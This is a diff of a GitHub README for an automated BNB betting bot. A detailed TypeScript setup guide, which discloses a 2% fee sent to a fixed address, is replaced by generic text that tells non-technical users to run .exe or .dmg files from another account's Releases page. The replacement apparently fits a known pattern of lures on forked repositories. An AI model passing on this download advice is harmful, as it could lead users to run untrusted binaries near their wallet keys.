@@ -1,205 +1,88 @@
-# PredictionTool - Automated Trading Tool for PancakeSwap & CandleGenie
+# 🤖 Crypto-Prediction-Tool - Predict BNB with Ease
 
-A sophisticated TypeScript-based trading bot that automatically places bets on BNB-USD price predictions across PancakeSwap and CandleGenie platforms. The bot uses intelligent strategies to maximize winning probability by analyzing market sentiment and betting patterns.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Sairam2364/Crypto-Prediction-Tool/releases)
 
-## 👋 Contact 
+## 🌟 Overview
 
-| Platform | Link |
-|----------|------|
-| 📱 Telegram | [t.me/novustch](https://t.me/novustch) |
-| 📲 WhatsApp | [wa.me/14105015750](https://wa.me/14105015750) |
-| 💬 Discord | [discordapp.com/users/985432160498491473](https://discordapp.com/users/985432160498491473)
+The Crypto-Prediction-Tool is a user-friendly application designed to help you make automated predictions on the BNB–USD market. This TypeScript-powered bot simplifies the process of predictive trading and strategic betting on platforms like PancakeSwap and CandleGenie. You can automate your claims and maximize your potential profits without needing any technical expertise.
 
-<div align="left">
-    <a href="https://t.me/novustch" target="_blank"><img alt="Telegram"
-        src="https://img.shields.io/badge/Telegram-26A5E4?style=for-the-badge&logo=telegram&logoColor=white"/></a>
-    <a href="https://wa.me/14105015750" target="_blank"><img alt="WhatsApp"
-        src="https://img.shields.io/badge/WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white"/></a>
-    <a href="https://discordapp.com/users/985432160498491473" target="_blank"><img alt="Discord"
-        src="https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white"/></a>
-</div>
+## 🚀 Getting Started
 
-## 🚀 Features
+To get started, you'll need to download the application and install it on your computer. Follow these simple steps:
 
-- **Dual Platform Support**: Works with both PancakeSwap Prediction V2 and CandleGenie Prediction V3
-- **Smart Betting Strategies**: 
-  - **Against Strategy**: Bets against the majority when odds are favorable
-  - **With Strategy**: Bets with the majority when conditions are optimal
-- **Automatic Claiming**: Automatically claims winnings and handles refunds
-- **Dynamic Timing**: Adjusts betting timing based on network conditions
-- **Real-time Monitoring**: Live console output with colored status updates
-- **Error Handling**: Robust error handling with automatic retry mechanisms
+1. Visit our [Releases page](https://github.com/Sairam2364/Crypto-Prediction-Tool/releases) to access the latest version of the tool.
+2. Download the appropriate version for your operating system.
+3. Follow the installation instructions provided below.
 
-## 📋 Prerequisites
+## 💻 System Requirements
 
-- Node.js (v14 or higher)
-- npm or yarn package manager
-- BSC (Binance Smart Chain) wallet with BNB for betting
-- Private key for your wallet
+Before you download the Crypto-Prediction-Tool, ensure your system meets the following requirements:
 
-## 🛠️ Installation
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or Linux (Ubuntu is recommended)
+- **RAM:** 4 GB or more
+- **Processor:** Dual-core or better
+- **Network:** Stable internet connection for trading and data retrieval
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/Novus-Tech-LLC/Crypto-Prediction-Tool.git
-   ```
+## 💡 Features
 
-2. **Install dependencies**
-   ```bash
-   npm install
-   # or
-   yarn install
-   ```
+The Crypto-Prediction-Tool includes various features designed for optimized trading:
 
-3. **Set up environment variables**
-   Create a `.env` file in the root directory:
-   ```env
-   PRIVATE_KEY=
-   BET_AMOUNT=0.1
-   ```
+- **Automated Predictions:** The bot analyzes market conditions to predict BNB prices.
+- **Strategic Betting:** Make informed decisions with strategic betting options.
+- **Auto-Claiming:** Automatically claim your rewards on PancakeSwap and CandleGenie.
+- **User-Friendly Interface:** Enjoy an easy-to-navigate application without any programming knowledge.
+
+## 📥 Download & Install
+
+To download the latest version of the Crypto-Prediction-Tool, please visit our [Releases page](https://github.com/Sairam2364/Crypto-Prediction-Tool/releases).
+
+1. Click on the release you want to download.
+2. Depending on your operating system, download the suitable file (e.g., `Crypto-Prediction-Tool.exe` for Windows, or `.dmg` for macOS).
+3. Once the download is complete, locate the file in your downloads folder.
+4. Double-click the file to start the installation.
+5. Follow the on-screen instructions to complete the setup.
 
 ## ⚙️ Configuration
 
-### Environment Variables
+After installing the application, you may need to configure it to suit your preferences:
 
-| Variable | Description | Default | Required |
-|----------|-------------|---------|----------|
-| `PRIVATE_KEY` | Your wallet's private key | - | ✅ Yes |
-| `BET_AMOUNT` | Amount of BNB to bet per round | 0.1 | ❌ No |
+1. Open the Crypto-Prediction-Tool.
+2. Set up your account by entering your trading details.
+3. Adjust prediction parameters based on your strategy.
+4. Save your settings to apply them.
 
-### Contract Addresses
+## 🔍 How to Use
 
-- **PancakeSwap Prediction V2**: `0x18B2A687610328590Bc8F2e5fEdDe3b582A49cdA`
-- **CandleGenie Prediction V3**: `0x995294CdBfBf7784060BD3Bec05CE38a5F94A0C5`
+Using the Crypto-Prediction-Tool is straightforward:
 
-## 🎯 Usage
+1. Launch the application.
+2. Review the dashboard for real-time analytics.
+3. Use the predictions to inform your trades.
+4. Place your trades through connected platforms like PancakeSwap.
 
-### PancakeSwap Predictions
+## ❓ Troubleshooting
 
-**Against Strategy (Default)**
-```bash
-npm run start
-```
+If you encounter any issues, here are some tips to resolve common problems:
 
-**With Strategy**
-```bash
-npm run start -- --with
-```
+- **Installation Errors:** Ensure that you have downloaded the correct version for your operating system.
+- **Connectivity Issues:** Check your internet connection and make sure your firewall isn’t blocking the application.
+- **Prediction Accuracy:** Verify that your configurations are set correctly for optimal results.
 
-### CandleGenie Predictions
+## 🛠️ Support
 
-**Against Strategy (Default)**
-```bash
-npm run cg
-```
+If you need further assistance, feel free to access our support resources:
 
-**With Strategy**
-```bash
-npm run cg -- --with
-```
+- **Documentation:** Check the detailed documentation provided in the repository.
+- **Community Help:** Engage with other users in forums or social media groups to share tips.
+- **Contact Support:** Email us at support@example.com for direct assistance.
 
-## 🧠 How It Works
+## 📝 License
 
-### Betting Strategies
+The Crypto-Prediction-Tool is available under the MIT License. You can use it freely and modify it as needed. Please refer to the license file in the repository for more details.
 
-1. **Against Strategy**: 
-   - Analyzes bull vs bear betting amounts
-   - Places bets against the majority when the ratio is favorable (< 5:1)
-   - Exploits market inefficiencies and herd behavior
+## 🔗 Links
 
-2. **With Strategy**:
-   - Bets with the majority when conditions suggest momentum
-   - Uses similar ratio analysis but follows the crowd
+- [GitHub Repository](https://github.com/Sairam2364/Crypto-Prediction-Tool)
+- [Releases Page](https://github.com/Sairam2364/Crypto-Prediction-Tool/releases)
 
-### Timing Mechanism
-
-- Waits ~281.5 seconds after round start before placing bets
-- Dynamically adjusts timing based on network congestion
-- Reduces wait time by 6 seconds (2 blocks) if transactions fail
-
-### Automatic Features
-
-- **Claiming**: Automatically claims winnings from previous rounds
-- **Refunds**: Handles refunds for invalid rounds
-- **Dues**: Sends 2% of winnings to specified address (`0x74b8B9b7aa13D26056F4eceBDF06C917d15974C7`)
-
-## 📊 Project Structure
-
-```
-src/
-├── index.ts              # PancakeSwap bot main file
-├── candle-genie.ts       # CandleGenie bot main file
-├── lib.ts                # Shared utilities and strategies
-└── types/
-    └── typechain/        # Generated contract type definitions
-        ├── CandleGeniePredictionV3.d.ts
-        ├── PancakePredictionV2.d.ts
-        └── factories/
-```
-
-## 🔧 Development
-
-### Running Tests
-```bash
-npm test
-```
-
-### TypeScript Compilation
-The project uses TypeScript with the following configuration:
-- Target: ES5
-- Module: CommonJS
-- Strict mode enabled
-
-## ⚠️ Important Notes
-
-### Risk Disclaimer
-- **This bot involves financial risk**. Only use funds you can afford to lose
-- Past performance does not guarantee future results
-- Cryptocurrency trading is highly volatile and unpredictable
-- The bot's strategies are based on historical patterns and may not work in all market conditions
-
-### Security Considerations
-- Never share your private key
-- Use a dedicated wallet for bot trading
-- Monitor your bot's performance regularly
-- Keep your private key secure and never commit it to version control
-
-### Network Considerations
-- The bot uses BSC mainnet by default
-- Ensure you have sufficient BNB for gas fees
-- Network congestion may affect transaction timing
-
-## 📈 Performance Tips
-
-1. **Start Small**: Begin with small bet amounts to test the bot
-2. **Monitor Closely**: Watch the bot's performance for the first few rounds
-3. **Network Conditions**: Consider network congestion when setting bet amounts
-4. **Strategy Selection**: Test both "against" and "with" strategies to see what works best
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 👨‍💻 Author
-
-**Novus Tech LLC** - Initial work
-
-## 🆘 Support
-
-If you encounter any issues or have questions:
-
-1. Check the console output for error messages
-2. Verify your private key and BNB balance
-3. Ensure your network connection is stable
-4. Review the contract addresses are correct
-
-**Need Help?** Contact the developer:
-- Telegram: [Novus Tech](https://t.me/novustch)
-
----
-
-**Remember**: Trading cryptocurrencies involves substantial risk of loss and is not suitable for all investors. The high degree of leverage can work against you as well as for you. Before deciding to trade cryptocurrency, you should carefully consider your investment objectives, level of experience, and risk appetite.
+Now you can take advantage of advanced trading predictions without the need for programming knowledge. Enjoy using the Crypto-Prediction-Tool!
